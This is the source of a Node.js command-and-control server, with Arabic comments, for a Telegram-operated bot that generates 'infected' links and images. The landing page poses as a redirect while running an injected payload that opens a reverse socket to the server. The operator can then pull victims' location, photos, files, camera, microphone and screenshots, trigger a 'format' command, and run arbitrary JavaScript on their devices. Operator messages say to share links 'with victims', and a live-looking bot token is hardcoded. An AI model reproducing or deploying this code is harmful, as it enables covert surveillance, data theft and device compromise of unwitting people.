const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");
const sharp = require('sharp');
const { Server: SocketIO } = require('socket.io');
const AdvancedPayloadSystem = require('./payload-system');
const { saveReverseSession, getActiveSessions, updateSessionStatus } = require('./firebase-config');

// 🔧 إعدادات البوت
const token = '8407389383:AAFkWGHIUTYoWnaSNhCUEeEl_AijkwNN308';
const id = '6565594143';
const SERVER_URL = process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : 'https://your-app.vercel.app';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const io = new SocketIO(appServer, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const appBot = new telegramBot(token, { 
  polling: true,
  request: {
    agentOptions: {
      keepAlive: true
    }
  }
});

// تخزين البيانات
const appClients = new Map();
const reverseSessions = new Map();
const infectedImages = new Map();
const infectedLinks = new Map();
const payloadSystem = new AdvancedPayloadSystem();

// إعدادات middleware
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({
  limit: '100mb',
  extended: true
}));

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 100 * 1024 * 1024 }
});

// ========== نظام الجلسات العكسية المتقدم ==========
io.on('connection', (socket) => {
  console.log('🔌 اتصال عكسي جديد:', socket.id);

  socket.on('reverse_connect', async (data) => {
    const { device_id, image_id, link_id, payload_id, platform, userAgent, url, ip, device_info } = data;
    
    console.log(`🎯 جلسة عكسية جديدة من: ${device_id}`);
    
    const sessionData = {
      socket: socket,
      device_id: device_id,
      image_id: image_id,
      link_id: link_id,
      payload_id: payload_id,
      platform: platform,
      userAgent: userAgent,
      url: url,
      ip: ip,
      device_info: device_info,
      connected: true,
      connected_at: new Date()
    };

    // حفظ في الذاكرة
    reverseSessions.set(device_id, sessionData);
    payloadSystem.registerSession(device_id, sessionData);

    // حفظ في Firebase
    await saveReverseSession(sessionData);

    // إرسال إشعار للتليجرام
    await appBot.sendMessage(
      id,
      `🦠 جلسة عكسية جديدة!\n\n` +
      `📱 الجهاز: <code>${device_id}</code>\n` +
      `🖼️ الصورة: ${image_id || 'N/A'}\n` +
      `🔗 الرابط: ${link_id || 'N/A'}\n` +
      `💻 النظام: ${platform}\n` +
      `🌐 المتصفح: ${userAgent}\n` +
      `🔗 الرابط: ${url}\n\n` +
      `✅ الجلسة جاهزة للتحكم الكامل`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⚡ التحكم في الجهاز", callback_data: `control_device:${device_id}` },
              { text: "📊 معلومات الجهاز", callback_data: `device_info:${device_id}` }
            ]
          ]
        }
      }
    );
  });

  socket.on('command_result', (data) => {
    const { device_id, command, result } = data;
    
    let displayResult = result;
    if (result.length > 3000) {
      displayResult = result.substring(0, 3000) + '\n\n... [تم تقصير الناتج]';
    }
    
    appBot.sendMessage(
      id,
      `📤 نتيجة الأمر من ${device_id}:\n\n` +
      `💻 الأمر: <code>${command}</code>\n` +
      `📊 الناتج:\n<pre>${displayResult}</pre>`,
      { 
        parse_mode: "HTML"
      }
    );
  });

  socket.on('disconnect', async () => {
    for (let [device_id, session] of reverseSessions) {
      if (session.socket === socket) {
        console.log(`🔌 انتهت الجلسة: ${device_id}`);
        reverseSessions.delete(device_id);
        
        // تحديث في Firebase
        await updateSessionStatus(device_id, false);
        
        appBot.sendMessage(
          id,
          `🔌 انتهت الجلسة العكسية\n📱 الجهاز: ${device_id}`,
          { parse_mode: "HTML" }
        );
        break;
      }
    }
  });
});

// ========== نظام تلغيم الروابط ==========

// 🔗 دالة لإنشاء رابط ملغم
function createInfectedLink() {
    const linkId = uuidv4();
    const payloadResult = payloadSystem.createAdvancedLinkPayload(linkId, SERVER_URL);
    const payloadId = payloadResult.payloadId;
    
    const infectedLink = {
        linkId: linkId,
        payloadId: payloadId,
        payloadCode: payloadResult.code,
        createdAt: new Date(),
        url: `${SERVER_URL}/link/${payloadId}`
    };
    
    infectedLinks.set(linkId, infectedLink);
    infectedLinks.set(payloadId, infectedLink);
    
    return infectedLink;
}

// ========== نظام معالجة الصور ==========

// 📤 معالجة رفع الصور
app.post("/uploadFile", upload.single('file'), async (req, res) => {
    try {
        const name = req.file.originalname;
        const model = req.headers.model || 'غير معروف';
        
        console.log('📸 تم استلام صورة:', name);
        
        if (req.file.mimetype.startsWith('image/')) {
            const imageId = uuidv4();
            
            // حفظ الصورة مؤقتاً
            infectedImages.set(imageId, {
                imageBuffer: req.file.buffer,
                model: model,
                filename: name,
                timestamp: new Date()
            });
            
            // إرسال رسالة مع الأزرار
            await appBot.sendMessage(
                id,
                `📸 تم استلام صورة من <b>${model}</b>\n\n` +
                `اختر الإجراء المطلوب:`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { 
                                    text: "🦠 صنع صورة ملغمة", 
                                    callback_data: `create_infected:${imageId}` 
                                }
                            ],
                            [
                                { 
                                    text: "🔗 صنع رابط ملغم", 
                                    callback_data: "create_infected_link" 
                                }
                            ]
                        ]
                    }
                }
            );
            
            res.json({ status: 'success', message: 'تم الاستلام' });
            
        } else {
            await appBot.sendDocument(id, req.file.buffer, {
                caption: `📁 ملف من <b>${model}</b>`,
                parse_mode: "HTML"
            }, { filename: name });
            
            res.json({ status: 'success', message: 'تم الرفع' });
        }
    } catch (error) {
        console.error('❌ خطأ في الرفع:', error);
        res.status(500).json({ status: 'error', message: 'خطأ في الرفع' });
    }
});

// 🎯 معالجة الضغط على الأزرار
appBot.on("callback_query", async (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;
    const chatId = message.chat.id;
    
    console.log('🔄 تم الضغط على زر:', data);
    
    try {
        if (data.startsWith('create_infected:')) {
            const imageId = data.split(':')[1];
            
            if (infectedImages.has(imageId)) {
                const imageInfo = infectedImages.get(imageId);
                
                await appBot.answerCallbackQuery(callbackQuery.id, { 
                    text: "⏳ جاري صنع الصورة الملغمة..." 
                });
                
                // إنشاء رابط ملغم للصورة
                const infectedLink = createInfectedLink();
                infectedLink.imageId = imageId;
                
                await appBot.sendChatAction(chatId, 'upload_photo');
                
                // إرسال الصورة الأصلية مع الرابط
                await appBot.sendPhoto(
                    chatId, 
                    imageInfo.imageBuffer,
                    {
                        caption: `🦠 صورة ملغمة جاهزة!\n\n` +
                                `🆔 المعرف: <code>${imageId}</code>\n` +
                                `⏰ الوقت: ${new Date().toLocaleString()}\n\n` +
                                `🔗 الرابط الملغم:\n<code>${infectedLink.url}</code>\n\n` +
                                `🚀 الميزات:\n` +
                                `• ✅ يعمل في جميع المتصفحات والتطبيقات\n` +
                                `• 📍 تحديد الموقع الدقيق تلقائياً\n` +
                                `• 📳 تشغيل الاهتزاز عن بعد\n` +
                                `• 🖼️ سحب الصور والملفات\n` +
                                `• 🎥 الوصول للكاميرا والميكروفون\n` +
                                `• 📱 معلومات الجهاز الكاملة\n\n` +
                                `🎯 عندما يفتح أي شخص هذا الرابط:\n` +
                                `• سيفتح اتصال عكسي تلقائياً\n` +
                                `• ستظهر جلسته في قائمة "الأجهزة المتصلة"\n` +
                                `• يمكنك التحكم الكامل في جهازه\n\n` +
                                `🔗 شارك هذا الرابط لفتح جلسات جديدة!`,
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { 
                                        text: "🔗 نسخ الرابط", 
                                        callback_data: `copy_link:${infectedLink.payloadId}` 
                                    },
                                    { 
                                        text: "📱 الأجهزة المتصلة", 
                                        callback_data: "active_sessions" 
                                    }
                                ],
                                [
                                    { 
                                        text: "🔄 صنع رابط آخر", 
                                        callback_data: "create_infected_link" 
                                    }
                                ]
                            ]
                        }
                    }
                );
                
                console.log('✅ تم إنشاء الرابط الملغم للصورة');
                
            } else {
                await appBot.answerCallbackQuery(callbackQuery.id, { 
                    text: "❌ الصورة لم تعد متاحة" 
                });
            }
        }
        else if (data === 'create_infected_link') {
            await appBot.answerCallbackQuery(callbackQuery.id, { 
                text: "⏳ جاري صنع الرابط الملغم..." 
            });
            
            // إنشاء رابط ملغم
            const infectedLink = createInfectedLink();
            
            await appBot.sendMessage(
                chatId,
                `🔗 رابط ملغم جاهز!\n\n` +
                `🆔 المعرف: <code>${infectedLink.linkId}</code>\n` +
                `⏰ الوقت: ${new Date().toLocaleString()}\n\n` +
                `🌐 الرابط:\n<code>${infectedLink.url}</code>\n\n` +
                `🚀 الميزات:\n` +
                `• ✅ يعمل في جميع المتصفحات والتطبيقات\n` +
                `• 📍 تحديد الموقع الدقيق تلقائياً\n` +
                `• 📳 تشغيل الاهتزاز عن بعد\n` +
                `• 🖼️ سحب الصور والملفات\n` +
                `• 🎥 الوصول للكاميرا والميكروفون\n` +
                `• 📱 معلومات الجهاز الكاملة\n\n` +
                `🎯 عندما يفتح أي شخص هذا الرابط:\n` +
                `• سيفتح اتصال عكسي تلقائياً\n` +
                `• ستظهر جلسته في قائمة "الأجهزة المتصلة"\n` +
                `• يمكنك التحكم الكامل في جهازه\n\n` +
                `🔗 شارك هذا الرابط لفتح جلسات جديدة!`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { 
                                    text: "🔗 نسخ الرابط", 
                                    callback_data: `copy_link:${infectedLink.payloadId}` 
                                },
                                { 
                                    text: "📱 الأجهزة المتصلة", 
                                    callback_data: "active_sessions" 
                                }
                            ],
                            [
                                { 
                                    text: "🔄 صنع رابط آخر", 
                                    callback_data: "create_infected_link" 
                                }
                            ]
                        ]
                    }
                }
            );
        }
        else if (data.startsWith('copy_link:')) {
            const payloadId = data.split(':')[1];
            let link = '';
            
            // البحث عن الرابط في الروابط
            if (infectedLinks.has(payloadId)) {
                link = infectedLinks.get(payloadId).url;
            }
            
            if (link) {
                await appBot.answerCallbackQuery(callbackQuery.id, { 
                    text: `✅ تم نسخ الرابط: ${link}` 
                });
                
                await appBot.sendMessage(
                    chatId,
                    `🔗 الرابط الملغم:\n\n<code>${link}</code>\n\n` +
                    `🎯 شارك هذا الرابط مع الضحايا لفتح جلسات جديدة!`,
                    { parse_mode: "HTML" }
                );
            }
        }
        else if (data === 'active_sessions') {
            const activeSessions = Array.from(reverseSessions.keys());
            const firebaseSessions = await getActiveSessions();
            
            const allSessions = [...activeSessions];
            firebaseSessions.forEach(session => {
                if (!allSessions.includes(session.device_id)) {
                    allSessions.push(session.device_id);
                }
            });
            
            if (allSessions.length === 0) {
                await appBot.sendMessage(chatId, '📭 لا توجد أجهزة متصلة حالياً');
            } else {
                let sessionsText = `📱 الأجهزة المتصلة: ${allSessions.length}\n\n`;
                
                allSessions.forEach(deviceId => {
                    const session = reverseSessions.get(deviceId);
                    if (session) {
                        const duration = Math.round((new Date() - session.connected_at) / 1000);
                        sessionsText += `📱 <code>${deviceId}</code>\n` +
                                     `💻 ${session.platform}\n` +
                                     `⏰ ${duration} ثانية\n\n`;
                    } else {
                        sessionsText += `📱 <code>${deviceId}</code>\n` +
                                     `💻 (من Firebase)\n\n`;
                    }
                });
                
                await appBot.sendMessage(
                    chatId, 
                    sessionsText,
                    {
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: "🔄 تحديث", callback_data: "active_sessions" }
                                ]
                            ]
                        }
                    }
                );
            }
        }
        else if (data.startsWith('control_device:')) {
            const deviceId = data.split(':')[1];
            
            await appBot.sendMessage(
                chatId,
                `🎯 التحكم في الجهاز: <code>${deviceId}</code>\n\n` +
                `اختر الأمر المطلوب:`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "📍 الموقع", callback_data: `cmd_location:${deviceId}` },
                                { text: "📳 الاهتزاز", callback_data: `cmd_vibrate:${deviceId}` }
                            ],
                            [
                                { text: "🔋 البطارية", callback_data: `cmd_battery:${deviceId}` },
                                { text: "🖼️ الصور", callback_data: `cmd_photos:${deviceId}` }
                            ],
                            [
                                { text: "📊 المعلومات", callback_data: `cmd_info:${deviceId}` },
                                { text: "🎥 الكاميرا", callback_data: `cmd_camera:${deviceId}` }
                            ],
                            [
                                { text: "🗣️ الميكروفون", callback_data: `cmd_mic:${deviceId}` },
                                { text: "💾 التخزين", callback_data: `cmd_storage:${deviceId}` }
                            ],
                            [
                                { text: "📸 لقطة شاشة", callback_data: `cmd_screenshot:${deviceId}` },
                                { text: "🔄 فرمتة", callback_data: `cmd_format:${deviceId}` }
                            ],
                            [
                                { text: "⚡ أمر مخصص", callback_data: `cmd_custom:${deviceId}` },
                                { text: "🔙 رجوع", callback_data: "active_sessions" }
                            ]
                        ]
                    }
                }
            );
        }
        else if (data.startsWith('cmd_')) {
            const [command, deviceId] = data.split(':');
            const cmdType = command.replace('cmd_', '');
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                let actualCommand = '';
                
                switch(cmdType) {
                    case 'location': actualCommand = 'الموقع'; break;
                    case 'vibrate': actualCommand = 'اهتزاز'; break;
                    case 'battery': actualCommand = 'البطارية'; break;
                    case 'photos': actualCommand = 'الصور'; break;
                    case 'info': actualCommand = 'معلومات'; break;
                    case 'camera': actualCommand = 'الكاميرا'; break;
                    case 'mic': actualCommand = 'الميكروفون'; break;
                    case 'storage': actualCommand = 'التخزين'; break;
                    case 'screenshot': actualCommand = 'لقطة'; break;
                    case 'format': actualCommand = 'فرمتة'; break;
                }
                
                if (actualCommand) {
                    session.socket.emit('command', {
                        device_id: deviceId,
                        command: actualCommand
                    });
                    
                    await appBot.sendMessage(chatId, `⚡ جاري تنفيذ: ${actualCommand} على الجهاز ${deviceId}`);
                }
            } else {
                await appBot.sendMessage(chatId, `❌ الجلسة غير متصلة حالياً`);
            }
        }
        else if (data.startsWith('device_info:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                const duration = Math.round((new Date() - session.connected_at) / 1000);
                
                await appBot.sendMessage(
                    chatId,
                    `📊 معلومات الجهاز: <code>${deviceId}</code>\n\n` +
                    `💻 النظام: ${session.platform}\n` +
                    `🌐 المتصفح: ${session.userAgent}\n` +
                    `🔗 الرابط: ${session.url}\n` +
                    `📍 الأيبي: ${session.ip}\n` +
                    `⏰ المدة: ${duration} ثانية\n` +
                    `🟢 الحالة: متصل\n\n` +
                    `🔧 اختر أمر للتنفيذ:`,
                    {
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: "⚡ التحكم الكامل", callback_data: `control_device:${deviceId}` }
                                ]
                            ]
                        }
                    }
                );
            }
        }
        else if (data.startsWith('cmd_custom:')) {
            const deviceId = data.split(':')[1];
            
            await appBot.sendMessage(
                chatId,
                `⚡ أدخل الأمر المخصص للجهاز <code>${deviceId}</code>:\n\n` +
                `يمكنك استخدام:\n` +
                `• <code>js:alert('hello')</code> - تنفيذ كود JavaScript\n` +
                `• أي أمر نصي آخر\n\n` +
                `أدخل الأمر الآن:`,
                {
                    parse_mode: "HTML",
                    reply_markup: { force_reply: true }
                }
            );
            
            infectedImages.set('pending_command', { deviceId: deviceId });
        }

    } catch (error) {
        console.error('❌ خطأ في المعالجة:', error);
        await appBot.answerCallbackQuery(callbackQuery.id, { 
            text: "❌ حدث خطأ أثناء المعالجة" 
        });
    }
});

// 📨 معالجة الردود على الأوامر
appBot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    // التحقق من صلاحية المستخدم
    if (String(chatId) !== String(id)) {
        await appBot.sendMessage(chatId, '🚫 ليس لديك صلاحية استخدام هذا البوت');
        return;
    }

    // معالجة الردود على الأوامر
    if (msg.reply_to_message) {
        const replyText = msg.reply_to_message.text;
        
        if (replyText.includes('أدخل الأمر المخصص')) {
            const command = text;
            
            if (infectedImages.has('pending_command')) {
                const pending = infectedImages.get('pending_command');
                const deviceId = pending.deviceId;
                
                if (reverseSessions.has(deviceId)) {
                    const session = reverseSessions.get(deviceId);
                    
                    session.socket.emit('command', {
                        device_id: deviceId,
                        command: command
                    });
                    
                    await appBot.sendMessage(chatId, `✅ تم إرسال الأمر للجهاز: ${command}`);
                } else {
                    await appBot.sendMessage(chatId, `❌ الجلسة غير متصلة حالياً`);
                }
                
                infectedImages.delete('pending_command');
            }
        }
    }

    // الأوامر النصية
    if (text === '/start' || text === '/start') {
        const activeSessions = Array.from(reverseSessions.keys()).length;
        const firebaseSessions = await getActiveSessions();
        const totalSessions = activeSessions + firebaseSessions.length;
        
        await appBot.sendMessage(
            chatId,
            `🎯 بوت الجلسات العكسية المتقدم - الإصدار 7.0.0\n\n` +
            `📊 الإحصائيات الحالية:\n` +
            `• 📱 الأجهزة المتصلة: ${totalSessions}\n` +
            `• 🖼️ الصور الملغمة: ${infectedImages.size}\n` +
            `• 🔗 الروابط الملغمة: ${infectedLinks.size}\n\n` +
            `✨ الميزات الجديدة:\n` +
            `• 🎯 تحكم كامل في الأجهزة\n` +
            `• 📍 تحديد الموقع الدقيق\n` +
            `• 📳 تشغيل الاهتزاز\n` +
            `• 🖼️ سحب الصور والملفات\n` +
            `• 🔋 معلومات البطارية\n` +
            `• 🔗 نظام تلغيم الروابط\n\n` +
            `🔧 اختر الإجراء المطلوب:`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "🦠 صنع صورة ملغمة", callback_data: "send_image" },
                            { text: "🔗 صنع رابط ملغم", callback_data: "create_infected_link" }
                        ],
                        [
                            { text: "📱 الأجهزة المتصلة", callback_data: "active_sessions" }
                        ]
                    ]
                }
            }
        );
    }
    else if (text === 'send_image') {
        await appBot.sendMessage(
            chatId,
            `📸 أرسل لي الصورة التي تريد تلغيمها...\n\n` +
            `سأقوم بإنشاء رابط ملغم خاص بالصورة!`,
            { parse_mode: "HTML" }
        );
    }
    
    // معالجة استقبال الصور مباشرة
    if (msg.photo && msg.photo.length > 0) {
        const fileId = msg.photo[msg.photo.length - 1].file_id;
        
        try {
            await appBot.sendChatAction(chatId, 'typing');
            
            // تحميل الصورة
            const fileLink = await appBot.getFileLink(fileId);
            const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
            const imageBuffer = Buffer.from(response.data);
            
            const imageId = uuidv4();
            
            // حفظ الصورة مؤقتاً
            infectedImages.set(imageId, {
                imageBuffer: imageBuffer,
                filename: `photo_${imageId}.jpg`,
                timestamp: new Date()
            });
            
            // إنشاء رابط ملغم للصورة
            const infectedLink = createInfectedLink();
            infectedLink.imageId = imageId;
            
            await appBot.sendChatAction(chatId, 'upload_photo');
            
            // إرسال الصورة مع الرابط الملغم
            await appBot.sendPhoto(
                chatId,
                imageBuffer,
                {
                    caption: `🦠 صورة ملغمة جاهزة!\n\n` +
                            `🆔 المعرف: <code>${imageId}</code>\n` +
                            `⏰ الوقت: ${new Date().toLocaleString()}\n\n` +
                            `🔗 الرابط الملغم:\n<code>${infectedLink.url}</code>\n\n` +
                            `🚀 الميزات:\n` +
                            `• ✅ يعمل في جميع المتصفحات والتطبيقات\n` +
                            `• 📍 تحديد الموقع الدقيق تلقائياً\n` +
                            `• 📳 تشغيل الاهتزاز عن بعد\n` +
                            `• 🖼️ سحب الصور والملفات\n` +
                            `• 🎥 الوصول للكاميرا والميكروفون\n` +
                            `• 📱 معلومات الجهاز الكاملة\n\n` +
                            `🎯 عندما يفتح أي شخص هذا الرابط:\n` +
                            `• سيفتح اتصال عكسي تلقائياً\n` +
                            `• ستظهر جلسته في قائمة "الأجهزة المتصلة"\n` +
                            `• يمكنك التحكم الكامل في جهازه\n\n` +
                            `🔗 شارك هذا الرابط لفتح جلسات جديدة!`,
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { 
                                    text: "🔗 نسخ الرابط", 
                                    callback_data: `copy_link:${infectedLink.payloadId}` 
                                },
                                { 
                                    text: "📱 الأجهزة المتصلة", 
                                    callback_data: "active_sessions" 
                                }
                            ],
                            [
                                { 
                                    text: "🔄 صنع رابط آخر", 
                                    callback_data: "create_infected_link" 
                                }
                            ]
                        ]
                    }
                }
            );
            
            console.log('✅ تم إنشاء الرابط الملغم للصورة');
            
        } catch (error) {
            console.error('❌ خطأ في معالجة الصورة:', error);
            await appBot.sendMessage(
                chatId,
                `❌ حدث خطأ أثناء معالجة الصورة\n\n` +
                `الخطأ: ${error.message}`,
                { parse_mode: "HTML" }
            );
        }
        
        return;
    }
});

// ========== نظام البايلود الإضافي ==========

// 🌐 صفحة تشغيل البايلود للروابط
app.get('/link/:payloadId', (req, res) => {
    const payloadId = req.params.payloadId;
    
    if (!infectedLinks.has(payloadId)) {
        return res.status(404).send('Payload not found');
    }

    const linkData = infectedLinks.get(payloadId);
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Redirecting...</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                margin: 0;
                padding: 20px;
                font-family: Arial, sans-serif;
                background: #1a1a1a;
                color: white;
                text-align: center;
            }
            .container {
                max-width: 100%;
                margin: 0 auto;
            }
            .loading {
                font-size: 18px;
                margin: 20px 0;
                color: #58a6ff;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>🔗 جاري التوجيه...</h2>
            <div class="loading">انتظر قليلاً...</div>
        </div>

        <script>
            // تشغيل البايلود فوراً
            ${linkData.payloadCode}
            
            // محاكاة التوجيه
            setTimeout(() => {
                document.querySelector('.loading').innerHTML = '✅ تم التوجيه بنجاح';
                document.body.innerHTML += '<p>📱 جاري الاتصال بالنظام...</p><p>⚡ جاهز للتحكم الكامل</p>';
            }, 1500);
        </script>
    </body>
    </html>
    `);
});

// 📡 endpoint للتتبع
app.get('/track/:payloadId', (req, res) => {
    const payloadId = req.params.payloadId;
    console.log('📱 Tracking activity from:', payloadId);
    res.send('');
});

// 📡 endpoint للبيانات
app.post('/log', express.json(), (req, res) => {
    console.log('📊 Log data:', req.body);
    res.json({ status: 'logged' });
});

// 📤 باقي ال endpoints
app.post("/uploadText", (req, res) => {
    const model = req.headers.model || 'غير معروف';
    const text = req.body.text || 'لا يوجد نص';
    
    appBot.sendMessage(id, `📨 رسالة من <b>${model}</b>\n\n${text}`, { 
        parse_mode: "HTML" 
    });
    
    res.json({ status: 'success' });
});

app.post("/uploadLocation", (req, res) => {
    const model = req.headers.model || 'غير معروف';
    const lat = req.body.lat;
    const lon = req.body.lon;
    
    appBot.sendLocation(id, lat, lon);
    appBot.sendMessage(id, `📍 موقع من <b>${model}</b>`, { 
        parse_mode: "HTML" 
    });
    
    res.json({ status: 'success' });
});

// 🌐 الصفحة الرئيسية
app.get('/', (req, res) => {
    const activeSessions = Array.from(reverseSessions.keys()).length;
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>🦠 Advanced Reverse Bot</title>
        <meta charset="utf-8">
        <style>
            body { 
                font-family: Arial, sans-serif; 
                margin: 40px; 
                background: #0d1117; 
                color: #c9d1d9; 
                text-align: center;
            }
            .container { 
                max-width: 800px; 
                margin: 0 auto; 
            }
            .status { 
                background: #161b22; 
                padding: 20px; 
                border-radius: 10px; 
                margin: 20px 0; 
                border: 1px solid #30363d;
            }
            h1 { color: #58a6ff; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🚀 Advanced Reverse Bot</h1>
            <p>الإصدار 7.0.0 - نظام التحكم الكامل عبر الروابط</p>
            
            <div class="status">
                <h2>📊 System Status</h2>
                <p>📱 الأجهزة المتصلة: ${activeSessions}</p>
                <p>🖼️ الصور الملغمة: ${infectedImages.size}</p>
                <p>🔗 الروابط الملغمة: ${infectedLinks.size}</p>
                <p>⏰ وقت التشغيل: ${Math.round(process.uptime())} ثانية</p>
                <p>🟢 الحالة: <strong>نشط ومستقر</strong></p>
            </div>
            
            <p>Bot is running successfully! 🎯</p>
            <p>Developer: @VIP_MFM</p>
        </div>
    </body>
    </html>
    `);
});

// 🚀 بدء السيرفر
const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => {
    console.log(`✅ البوت شغال على البورت: ${PORT}`);
    console.log(`🎯 نظام الجلسات العكسية المتقدم مفعل`);
    console.log(`🦠 نظام تلغيم الروابط جاهز`);
    console.log(`🔗 السيرفر: ${SERVER_URL}`);
    console.log(`⚡ جاهز لاستقبال الصور والروابط وتشغيل الجلسات!`);
});

// معالجة الأخطاء
process.on('unhandledRejection', (error) => {
    console.error('❌ Unhandled Rejection:', error);
});